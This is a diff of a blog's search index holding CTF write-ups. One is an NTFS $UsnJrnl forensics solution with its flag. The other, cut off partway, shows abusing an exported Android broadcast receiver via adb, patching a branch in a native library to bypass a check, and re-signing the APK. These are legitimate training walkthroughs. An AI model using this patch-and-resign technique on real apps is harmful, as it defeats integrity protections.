@@ -1,6 +1,108 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Hourglass (UOFTCTF-2024)</title>
+    <url>/2024/01/15/Hourglass%20(UOFTCTF-2024)/</url>
+    <content><![CDATA[<h2 id="Hourglass-Challenge-Write-up"><a href="#Hourglass-Challenge-Write-up" class="headerlink" title="Hourglass Challenge Write-up"></a>Hourglass Challenge Write-up</h2><h3 id="Challenge-Overview"><a href="#Challenge-Overview" class="headerlink" title="Challenge Overview"></a>Challenge Overview</h3><p>This challenge involved analyzing a forensic image of a workstation suspected of malicious activity. There was no Endpoint Detection and Response (EDR) agent running, which made traditional dynamic monitoring impossible. The goal was to identify recently created or renamed files that could indicate attacker activity.</p>
+<p>A key focus was on understanding how to extract file activity metadata from NTFS, specifically using the <strong>$UsnJrnl</strong> (Update Sequence Number Journal), which records detailed file system changes such as creations, deletions, and renames.</p>
+<hr>
+<h3 id="Tools-and-References"><a href="#Tools-and-References" class="headerlink" title="Tools and References"></a>Tools and References</h3><ul>
+<li><p>Understanding the <strong>NTFS $UsnJrnl</strong> is crucial. I recommend this detailed article for context:<br><a class="link"   href="https://www.orionforensics.com/forensics-tools/ntfs-journal-viewer-jv/" >NTFS $UsnJrnl Overview<i class="fa-sharp fa-regular fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em]"></i></p>
+</li>
+<li><p>The NTFS $UsnJrnl files reside in the <code>$Extend\$UsnJrnl</code> directory, primarily the <code>$J</code> file which contains the journal data.</p>
+</li>
+<li><p>The <strong>MFTCmd</strong> and <strong>Timeline Explorer</strong> tools by Eric Zimmerman were used to parse and analyze the journal data:<br><a class="link"   href="https://ericzimmerman.github.io/#!index.md" >Eric Zimmerman’s Tools<i class="fa-sharp fa-regular fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em]"></i></p>
+</li>
+</ul>
+<hr>
+<h3 id="Step-by-Step-Solution"><a href="#Step-by-Step-Solution" class="headerlink" title="Step-by-Step Solution"></a>Step-by-Step Solution</h3><h4 id="1-Extract-the-UsnJrnl-J-file"><a href="#1-Extract-the-UsnJrnl-J-file" class="headerlink" title="1. Extract the $UsnJrnl $J file"></a>1. Extract the $UsnJrnl <code>$J</code> file</h4><p>From the forensic image, locate and extract the <code>$Extend\$UsnJrnl\$J</code> file, which contains the journal of NTFS file activity.</p>
+<h4 id="2-Parse-the-UsnJrnl-data-using-MFTCmd"><a href="#2-Parse-the-UsnJrnl-data-using-MFTCmd" class="headerlink" title="2. Parse the $UsnJrnl data using MFTCmd"></a>2. Parse the $UsnJrnl data using MFTCmd</h4><p>Using <strong>MFTCmd</strong>, parse the <code>$J</code> file to convert the raw journal data into a CSV format. This CSV includes detailed entries about file operations such as creations, renames, and deletions, along with timestamps and other metadata.</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/img/UOFTCTF-2024/6.webp"
+                      alt="NTFS $UsnJrnl path and files overview" 
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/img/UOFTCTF-2024/7.webp"
+                      alt="Parsing $UsnJrnl $J file with MFTCmd tool" 
+                >
+
+<h4 id="3-Load-the-CSV-into-Timeline-Explorer"><a href="#3-Load-the-CSV-into-Timeline-Explorer" class="headerlink" title="3. Load the CSV into Timeline Explorer"></a>3. Load the CSV into Timeline Explorer</h4><p>Import the generated CSV file into <strong>Timeline Explorer</strong> for easier visualization and filtering of the file activity timeline.</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/img/UOFTCTF-2024/8.webp"
+                      alt="Viewing $UsnJrnl entries in Timeline Explorer" 
+                >
+
+<h4 id="4-Identify-newly-created-or-renamed-files"><a href="#4-Identify-newly-created-or-renamed-files" class="headerlink" title="4. Identify newly created or renamed files"></a>4. Identify newly created or renamed files</h4><p>Using Timeline Explorer:</p>
+<ul>
+<li>Search for recently created files by filtering on the “Update Reason” column.</li>
+<li>Focus on entries labeled as <strong>RenameOldName</strong> to track file rename events.</li>
+</ul>
+<h4 id="5-Investigate-suspicious-file-rename-entries"><a href="#5-Investigate-suspicious-file-rename-entries" class="headerlink" title="5. Investigate suspicious file rename entries"></a>5. Investigate suspicious file rename entries</h4><p>Two key entries were identified by their <strong>Entry Numbers</strong>:</p>
+<ul>
+<li><p>Entry Number <strong>111631</strong> corresponded to a file initially named <strong>“New Text Document.txt”</strong>. Further inspection revealed it was renamed to:</p>
+<p><strong><code>/Users/analyst/Desktop/flag.txt.txt</code></strong></p>
+<p>This file contained a decoy or fake flag.</p>
+</li>
+</ul>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/img/UOFTCTF-2024/9.webp"
+                      alt="Filter for entry number 111631 showing renamed file" 
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/img/UOFTCTF-2024/10.webp"
+                      alt="Contents of the fake flag.txt file" 
+                >
+
+<ul>
+<li><p>Entry Number <strong>36441</strong> corresponded to another renamed file located at:</p>
+<p><strong><code>/Windows/DiagTrack/Settings/settings.txt</code></strong></p>
+</li>
+</ul>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/img/UOFTCTF-2024/11.webp"
+                      alt="Filter for entry number 36441 showing renamed file" 
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/img/UOFTCTF-2024/12.webp"
+                      alt="Base64 string found inside settings.txt file" 
+                >
+
+<h4 id="6-Extract-and-decode-the-hidden-flag"><a href="#6-Extract-and-decode-the-hidden-flag" class="headerlink" title="6. Extract and decode the hidden flag"></a>6. Extract and decode the hidden flag</h4><p>The <code>settings.txt</code> file contained the following Base64-encoded string:</p>
+<p><code>Ky0tCiB1b2Z0Y3Rme1Q0c0tfU2NoM0R1bDNyX0ZVTn0KKy0t</code></p>
+<p>After decoding the string, the real flag was revealed:</p>
+<p><strong>uoftctf{T4sK_Sch3Dul3r_FUN}</strong></p>
+<hr>
+<h3 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h3><p>By leveraging the NTFS $UsnJrnl journal and Eric Zimmerman’s forensic tools, I was able to efficiently track recent file changes and uncover the attacker’s true flag hidden in a renamed settings file. This challenge highlights the power of NTFS journaling in forensic investigations to track file system events even without active monitoring agents.</p>
+<hr>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>Digital Forensics</category>
+      </categories>
+      <tags>
+        <tag>Forensics</tag>
+        <tag>EricZimmerman</tag>
+        <tag>NTFS</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Better Call Saul (JUST-Local-CTF)</title>
     <url>/2024/12/26/Better-Call-Saul%20(JUST-Local-CTF)/</url>
     <content><![CDATA[<h1 id="Who-You-Gonna-Call-📞"><a href="#Who-You-Gonna-Call-📞" class="headerlink" title="Who You Gonna Call? 📞"></a>Who You Gonna Call? 📞</h1><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>In the analysis of <code>/images/img/JUST-Local-2024/Who-You-Gonna-Call</code>, we can see that the mobile application was built using a <strong>native C++ library</strong>. This means that the Java or Kotlin code can call functions in the native library through the <strong>Java Native Interface (JNI)</strong>.<br>You can read more about native libraries <a class="link"   href="https://developer.android.com/studio/projects/add-native-code" >here<i class="fa-sharp fa-regular fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em]"></i>.</p>
@@ -277,105 +379,155 @@
       </categories>
   </entry>
   <entry>
-    <title>Hourglass (UOFTCTF-2024)</title>
-    <url>/2024/01/15/Hourglass%20(UOFTCTF-2024)/</url>
-    <content><![CDATA[<h2 id="Hourglass-Challenge-Write-up"><a href="#Hourglass-Challenge-Write-up" class="headerlink" title="Hourglass Challenge Write-up"></a>Hourglass Challenge Write-up</h2><h3 id="Challenge-Overview"><a href="#Challenge-Overview" class="headerlink" title="Challenge Overview"></a>Challenge Overview</h3><p>This challenge involved analyzing a forensic image of a workstation suspected of malicious activity. There was no Endpoint Detection and Response (EDR) agent running, which made traditional dynamic monitoring impossible. The goal was to identify recently created or renamed files that could indicate attacker activity.</p>
-<p>A key focus was on understanding how to extract file activity metadata from NTFS, specifically using the <strong>$UsnJrnl</strong> (Update Sequence Number Journal), which records detailed file system changes such as creations, deletions, and renames.</p>
-<hr>
-<h3 id="Tools-and-References"><a href="#Tools-and-References" class="headerlink" title="Tools and References"></a>Tools and References</h3><ul>
-<li><p>Understanding the <strong>NTFS $UsnJrnl</strong> is crucial. I recommend this detailed article for context:<br><a class="link"   href="https://www.orionforensics.com/forensics-tools/ntfs-journal-viewer-jv/" >NTFS $UsnJrnl Overview<i class="fa-sharp fa-regular fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em]"></i></p>
-</li>
-<li><p>The NTFS $UsnJrnl files reside in the <code>$Extend\$UsnJrnl</code> directory, primarily the <code>$J</code> file which contains the journal data.</p>
-</li>
-<li><p>The <strong>MFTCmd</strong> and <strong>Timeline Explorer</strong> tools by Eric Zimmerman were used to parse and analyze the journal data:<br><a class="link"   href="https://ericzimmerman.github.io/#!index.md" >Eric Zimmerman’s Tools<i class="fa-sharp fa-regular fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em]"></i></p>
-</li>
-</ul>
-<hr>
-<h3 id="Step-by-Step-Solution"><a href="#Step-by-Step-Solution" class="headerlink" title="Step-by-Step Solution"></a>Step-by-Step Solution</h3><h4 id="1-Extract-the-UsnJrnl-J-file"><a href="#1-Extract-the-UsnJrnl-J-file" class="headerlink" title="1. Extract the $UsnJrnl $J file"></a>1. Extract the $UsnJrnl <code>$J</code> file</h4><p>From the forensic image, locate and extract the <code>$Extend\$UsnJrnl\$J</code> file, which contains the journal of NTFS file activity.</p>
-<h4 id="2-Parse-the-UsnJrnl-data-using-MFTCmd"><a href="#2-Parse-the-UsnJrnl-data-using-MFTCmd" class="headerlink" title="2. Parse the $UsnJrnl data using MFTCmd"></a>2. Parse the $UsnJrnl data using MFTCmd</h4><p>Using <strong>MFTCmd</strong>, parse the <code>$J</code> file to convert the raw journal data into a CSV format. This CSV includes detailed entries about file operations such as creations, renames, and deletions, along with timestamps and other metadata.</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/img/UOFTCTF-2024/6.webp"
-                      alt="NTFS $UsnJrnl path and files overview" 
-                >
+    <title>OXIDIZED INTENTIONS (TFCCTF-2025)</title>
+    <url>/2025/09/03/OXIDIZED%20INTENTIONS%20(TFCCTF-2025)/</url>
+    <content><![CDATA[<h1 id="Descriptions"><a href="#Descriptions" class="headerlink" title="Descriptions"></a>Descriptions</h1><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Can you find what lays behind this simple game ?</span><br></pre></td></tr></table></figure></div>
 
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/img/UOFTCTF-2024/7.webp"
-                      alt="Parsing $UsnJrnl $J file with MFTCmd tool" 
-                >
-
-<h4 id="3-Load-the-CSV-into-Timeline-Explorer"><a href="#3-Load-the-CSV-into-Timeline-Explorer" class="headerlink" title="3. Load the CSV into Timeline Explorer"></a>3. Load the CSV into Timeline Explorer</h4><p>Import the generated CSV file into <strong>Timeline Explorer</strong> for easier visualization and filtering of the file activity timeline.</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/img/UOFTCTF-2024/8.webp"
-                      alt="Viewing $UsnJrnl entries in Timeline Explorer" 
-                >
-
-<h4 id="4-Identify-newly-created-or-renamed-files"><a href="#4-Identify-newly-created-or-renamed-files" class="headerlink" title="4. Identify newly created or renamed files"></a>4. Identify newly created or renamed files</h4><p>Using Timeline Explorer:</p>
+<p>Attachments: </p>
 <ul>
-<li>Search for recently created files by filtering on the “Update Reason” column.</li>
-<li>Focus on entries labeled as <strong>RenameOldName</strong> to track file rename events.</li>
+<li>app-release.apk</li>
 </ul>
-<h4 id="5-Investigate-suspicious-file-rename-entries"><a href="#5-Investigate-suspicious-file-rename-entries" class="headerlink" title="5. Investigate suspicious file rename entries"></a>5. Investigate suspicious file rename entries</h4><p>Two key entries were identified by their <strong>Entry Numbers</strong>:</p>
-<ul>
-<li><p>Entry Number <strong>111631</strong> corresponded to a file initially named <strong>“New Text Document.txt”</strong>. Further inspection revealed it was renamed to:</p>
-<p><strong><code>/Users/analyst/Desktop/flag.txt.txt</code></strong></p>
-<p>This file contained a decoy or fake flag.</p>
+<h2 id="Challenge-Overview"><a href="#Challenge-Overview" class="headerlink" title="Challenge Overview:"></a>Challenge Overview:</h2><p>The Android application is built with a native library for ARM processors and is written in <strong>Kotlin</strong>, so you need to run it on an <strong><code>arm64-v8a</code></strong> environment to execute the app properly. From there, you can interact with the application and analyze how it actually works.</p>
+<p>So, I ended up running the application on my personal phone because I couldn’t find an ARM emulator in Android Studio 😅.</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/img/OXIDIZED_INTENTIONS_thefewchosen-2025/1.png"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/img/OXIDIZED_INTENTIONS_thefewchosen-2025/2.png"
+                     
+                ></p>
+<p>Basically, the app is a simple game with a <strong>score</strong> system and <strong>3 lives</strong>. When digging into the APK, I noticed two important things:</p>
+<ol>
+<li><p>The app loads a native library:<br> <code>arm64-v8a/liboxi.so</code></p>
 </li>
-</ul>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/img/UOFTCTF-2024/9.webp"
-                      alt="Filter for entry number 111631 showing renamed file" 
-                >
+<li><p>In the <strong><code>AndroidManifest.xml</code></strong>, there is an <strong>exported broadcast receiver</strong> that we can abuse:</p>
+ <div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">receiver</span> <span class="attr">android:name</span>=<span class="string">&quot;com.example.oxidized_intentions.TicketReceiver&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;com.example.oxidized_intentions.TICKET&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
 
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/img/UOFTCTF-2024/10.webp"
-                      alt="Contents of the fake flag.txt file" 
-                >
-
-<ul>
-<li><p>Entry Number <strong>36441</strong> corresponded to another renamed file located at:</p>
-<p><strong><code>/Windows/DiagTrack/Settings/settings.txt</code></strong></p>
+<p> Because <code>android:exported=&quot;true&quot;</code> is set, this means any external app (or even <code>adb</code>) can send an intent with the action <strong><code>com.example.oxidized_intentions.TICKET</code></strong> and trigger the receiver.</p>
 </li>
+</ol>
+<h2 id="Source-Code-Analysis"><a href="#Source-Code-Analysis" class="headerlink" title="Source Code Analysis"></a>Source Code Analysis</h2><p>Looking into the decompiled source, we see the following relevant pieces:</p>
+<p><strong>Native class</strong></p>
+<div class="highlight-container" data-rel="Kotlin"><figure class="iseeu highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">Native</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> static <span class="keyword">final</span> Native INSTANCE = new Native();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@JvmStatic</span></span><br><span class="line">    <span class="keyword">public</span> static <span class="keyword">final</span> native String getFlag(Context context, String str, String str2, int i);</span><br><span class="line"></span><br><span class="line">    static &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;oxi&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>This shows that the actual <strong>flag generation logic is hidden inside the native library <code>liboxi.so</code></strong> via the function <code>getFlag(...)</code>.</p>
+<div class="highlight-container" data-rel="Kotlin"><figure class="iseeu highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="title">extends</span> <span class="title">ComponentActivity</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void onCreate(Bundle bundle) &#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(bundle);</span><br><span class="line">        setContent &#123; <span class="comment">/* Compose UI code */</span> &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>MainActivity</strong></p>
+<div class="highlight-container" data-rel="Kotlin"><figure class="iseeu highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="title">extends</span> <span class="title">ComponentActivity</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void onCreate(Bundle bundle) &#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(bundle);</span><br><span class="line">        setContent &#123; <span class="comment">/* Compose UI code */</span> &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>Nothing too interesting here</p>
+<p><strong>TicketReceiver</strong></p>
+<div class="highlight-container" data-rel="Kotlin"><figure class="iseeu highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> void onReceive(Context context, Intent intent) &#123;</span><br><span class="line">    String stringExtra = intent.getStringExtra(<span class="string">&quot;seed&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (stringExtra == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Log.d(<span class="string">&quot;OXI&quot;</span>, <span class="string">&quot;Got broadcast, seed=&quot;</span> + stringExtra);</span><br><span class="line"></span><br><span class="line">    int i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (int i2 = <span class="number">0</span>; i2 &lt; stringExtra.length(); i2++) &#123;</span><br><span class="line">        i ^= stringExtra.charAt(i2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String flag = Native.getFlag(context, stringExtra, PART_J, i &amp; <span class="number">255</span>);</span><br><span class="line"></span><br><span class="line">    Toast.makeText(context, flag, <span class="number">1</span>).show();</span><br><span class="line">    Log.d(<span class="string">&quot;OXI&quot;</span>, <span class="string">&quot;FLAG=&quot;</span> + flag);</span><br><span class="line"></span><br><span class="line">    Intent intent2 = new Intent(ACTION_FLAGGED);</span><br><span class="line">    intent2.setPackage(context.getPackageName());</span><br><span class="line">    intent2.putExtra(EXTRA_FLAG, flag);</span><br><span class="line">    context.sendBroadcast(intent2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>Here’s what happens inside the <strong><code>TicketReceiver</code></strong>:</p>
+<ol>
+<li><p>It extracts the string extra <code>&quot;seed&quot;</code> from the broadcast intent.</p>
+</li>
+<li><p>If it’s missing, it returns immediately.</p>
+</li>
+<li><p>It logs the seed and computes an integer <code>i</code> by XOR’ing all the characters in the seed.</p>
+</li>
+<li><p>It then calls <code>Native.getFlag(context, seed, PART_J, i &amp; 255)</code> to generate the flag.</p>
+</li>
+<li><p>The flag is shown in a <strong>Toast</strong> and logged.</p>
+</li>
+<li><p>Finally, it broadcasts the flag inside the app.</p>
+</li>
+</ol>
+<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><h3 id="Finding-the-correct-seed"><a href="#Finding-the-correct-seed" class="headerlink" title="Finding  the correct seed"></a>Finding  the correct seed</h3><p>By sending a broadcast with the correct <strong><code>seed</code></strong> value, we can trigger <code>TicketReceiver</code>, which calls into the native library to compute and reveal the flag.</p>
+<p>So now, let’s perform a <strong>static analysis</strong> of the <strong><code>liboxi.so</code></strong> library to figure out how we can determine the correct <strong><code>seed</code></strong>.</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/img/OXIDIZED_INTENTIONS_thefewchosen-2025/4.png"
+                     
+                ></p>
+<p>Inside the function <strong><code>sub_11A4C</code></strong>, we can see a comparison being made against a hardcoded string located in the <strong><code>.rodata</code></strong> section. If the comparison fails, the code returns <code>FAKE&#123;wrong_seed&#125;</code>, otherwise the execution continues and eventually generates the flag.</p>
+<p>Next, we need to send the correct seed value to the <code>TicketReceiver</code> using the following command:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">adb shell am broadcast -n com.example.oxidized_intentions/.TicketReceiver --es seed <span class="string">&quot;fe2o3rust&quot;</span></span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/img/OXIDIZED_INTENTIONS_thefewchosen-2025/5.png"
+                     
+                ></p>
+<p>Oops! <strong><code>FAKE&#123;2152411021524119&#125;</code></strong> – that’s a fake flag. What went wrong?</p>
+<h3 id="Patching-the-HACKER-Check"><a href="#Patching-the-HACKER-Check" class="headerlink" title="Patching the HACKER Check"></a>Patching the HACKER Check</h3><p>After digging deeper into <strong><code>liboxi.so</code></strong>, I discovered that inside the function <strong><code>sub_11A4C</code></strong> there’s an additional security check: the variable <strong><code>HACKER</code></strong> must be set to <strong><code>HACKER = 1</code></strong>. I realized I could simply patch it to bypass the restriction.</p>
+<ol>
+<li><p>Decompile the APK using Apktool :</p>
+ <div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\refai\Desktop\OXIDIZED INTENTIONS&gt; apktool d .\app<span class="literal">-release</span>.apk</span><br><span class="line">I: <span class="keyword">Using</span> Apktool 2.10.0 on app-release.apk with 4 thread(s).</span><br><span class="line">I: Baksmaling classes.dex...</span><br><span class="line">I: Baksmaling classes2.dex...</span><br><span class="line">I: Loading resource table...</span><br><span class="line">I: Decoding file<span class="literal">-resources</span>...</span><br><span class="line">I: Loading resource table from file: C:\Users\refai\AppData\Local\apktool\framework\<span class="number">1</span>.apk</span><br><span class="line">I: Decoding values */* XMLs...</span><br><span class="line">I: Decoding AndroidManifest.xml with resources...</span><br><span class="line">I: Regular manifest package...</span><br><span class="line">I: Copying assets and libs...</span><br><span class="line">I: Copying unknown files...</span><br><span class="line">I: Copying original files...</span><br><span class="line">I: Copying META<span class="literal">-INF</span>/services directory</span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p>Analyze <code>liboxi.so</code><br> Open <code>liboxi.so</code> using <strong>Ghidra</strong> or <strong>IntelliJ IDEA</strong> from the path <code>app-release\lib\arm64-v8a</code></p>
+</li>
+<li><p>Patch the security check<br> I modified the bytes from:</p>
+ <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">E1 07 00 54 AA 64 84 D2 E8 A7 43 A9 4A 84 B0 F2</span><br></pre></td></tr></table></figure></div>
+<p> to:</p>
+ <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">E0 07 00 54 AA 64 84 D2 E8 A7 43 A9 4A 84 B0 F2</span><br></pre></td></tr></table></figure></div>
+<p> this changes the instruction from:</p>
+ <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">B.NE loc_11EDC   ; E1 07 00 54 AA 64 84 D2 E8 A7 43 A9 4A 84 B0 F2</span><br></pre></td></tr></table></figure></div>
+<p> to:</p>
+ <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">B.EQ loc_11EDC   ; E0 07 00 54 AA 64 84 D2 E8 A7 43 A9 4A 84 B0 F2</span><br></pre></td></tr></table></figure></div>
+<p> <img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/img/OXIDIZED_INTENTIONS_thefewchosen-2025/8.png"
+                     
+                ></p>
+</li>
+<li><p>Rebuild and sign the APK</p>
+<ul>
+<li><p>Rebuild the patched APK using Apktool:</p>
+  <div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\refai\Desktop\OXIDIZED INTENTIONS\app<span class="literal">-release</span>&gt; apktool b .</span><br><span class="line">I: <span class="keyword">Using</span> Apktool 2.10.0 with 4 thread(s).</span><br><span class="line">I: Checking whether sources has changed...</span><br><span class="line">I: Smaling smali folder into classes.dex...</span><br><span class="line">I: Checking whether sources has changed...</span><br><span class="line">I: Smaling smali_classes2 folder into classes2.dex...</span><br><span class="line">I: Checking whether resources has changed...</span><br><span class="line">I: Building resources...</span><br><span class="line">I: Copying libs... (/lib)</span><br><span class="line">I: Copying libs... (/kotlin)</span><br><span class="line">I: Copying libs... (/META<span class="literal">-INF</span>/services)</span><br><span class="line">I: Building apk file...</span><br><span class="line">I: Copying unknown files/<span class="built_in">dir</span>...</span><br><span class="line">I: Built apk into: .\dist\app<span class="literal">-release</span>.apk</span><br></pre></td></tr></table></figure></div></li>
+<li><p>Generate a self-signed certificate and sign the APK:</p>
+  <div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\refai\Desktop\OXIDIZED INTENTIONS\app<span class="literal">-release</span>\dist&gt; keytool <span class="literal">-genkeypair</span> <span class="literal">-v</span> <span class="literal">-keystore</span> android.keystore <span class="literal">-alias</span> research_key <span class="literal">-keyalg</span> RSA <span class="literal">-keysize</span> <span class="number">2048</span> <span class="literal">-validity</span> <span class="number">10000</span></span><br><span class="line">Enter keystore password:  </span><br><span class="line">Re<span class="literal">-enter</span> new password: </span><br><span class="line">Enter the distinguished name. Provide a single dot (.) to leave a sub<span class="literal">-component</span> empty or press ENTER to use the default value <span class="keyword">in</span> braces.</span><br><span class="line">What is your first and last name?</span><br><span class="line">What is the name of your organizational unit?</span><br><span class="line">What is the name of your organization?</span><br><span class="line">What is the name of your City or Locality?</span><br><span class="line">What is the name of your State or Province?</span><br><span class="line">What is the two<span class="literal">-letter</span> country code <span class="keyword">for</span> this unit?</span><br><span class="line">Is CN=Unknown, OU=Unknown, O=Unknown, L=Unknown, ST=Unknown, C=Unknown correct?</span><br><span class="line">[<span class="type">no</span>]:  yes</span><br><span class="line">Generating <span class="number">2048</span><span class="literal">-bit</span> RSA key pair and self<span class="literal">-signed</span> certificate (SHA384withRSA) with a validity of <span class="number">10</span>,<span class="number">000</span> days</span><br><span class="line">		<span class="keyword">for</span>: CN=Unknown, OU=Unknown, O=Unknown, L=Unknown, ST=Unknown, C=Unknown</span><br><span class="line">[<span class="type">Storing</span> <span class="type">android.keystore</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+  <div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\refai\Desktop\OXIDIZED INTENTIONS\app<span class="literal">-release</span>\dist&gt; jarsigner <span class="literal">-verbose</span> <span class="literal">-sigalg</span> SHA1withRSA <span class="literal">-digestalg</span> SHA1 <span class="literal">-keystore</span> android.keystore .\app<span class="literal">-release</span>.apk research_key</span><br><span class="line">Enter Passphrase <span class="keyword">for</span> keystore: </span><br><span class="line">adding: META<span class="literal">-INF</span>/MANIFEST.MF</span><br><span class="line">adding: META<span class="literal">-INF</span>/RESEARCH.SF</span><br><span class="line">adding: META<span class="literal">-INF</span>/RESEARCH.RSA</span><br><span class="line">signing: AndroidManifest.xml</span><br><span class="line">signing: classes.dex</span><br><span class="line">signing: classes2.dex</span><br><span class="line">signing: kotlin/annotation/annotation.kotlin_builtins</span><br><span class="line">.................</span><br><span class="line">.................</span><br><span class="line">.................</span><br><span class="line">&gt;&gt;&gt; Signer</span><br><span class="line">	X.<span class="number">509</span>, CN=Unknown, OU=Unknown, O=Unknown, L=Unknown, ST=Unknown, C=Unknown</span><br><span class="line">	Signature algorithm: SHA384withRSA, <span class="number">2048</span><span class="literal">-bit</span> RSA key</span><br><span class="line">	[<span class="type">trusted</span> <span class="type">certificate</span>]</span><br><span class="line"></span><br><span class="line">jar signed.</span><br><span class="line"></span><br><span class="line">Warning:</span><br><span class="line">The signer<span class="string">&#x27;s certificate is self-signed.</span></span><br><span class="line"><span class="string">The SHA1 algorithm specified for the -digestalg option is considered a security risk and is disabled.</span></span><br><span class="line"><span class="string">The SHA1withRSA algorithm specified for the -sigalg option is considered a security risk and is disabled.</span></span><br></pre></td></tr></table></figure></div></li>
 </ul>
-<img  
+</li>
+<li><p>Optimize and Finalize the APK</p>
+<ul>
+<li><p>Align the APK using zipalign:</p>
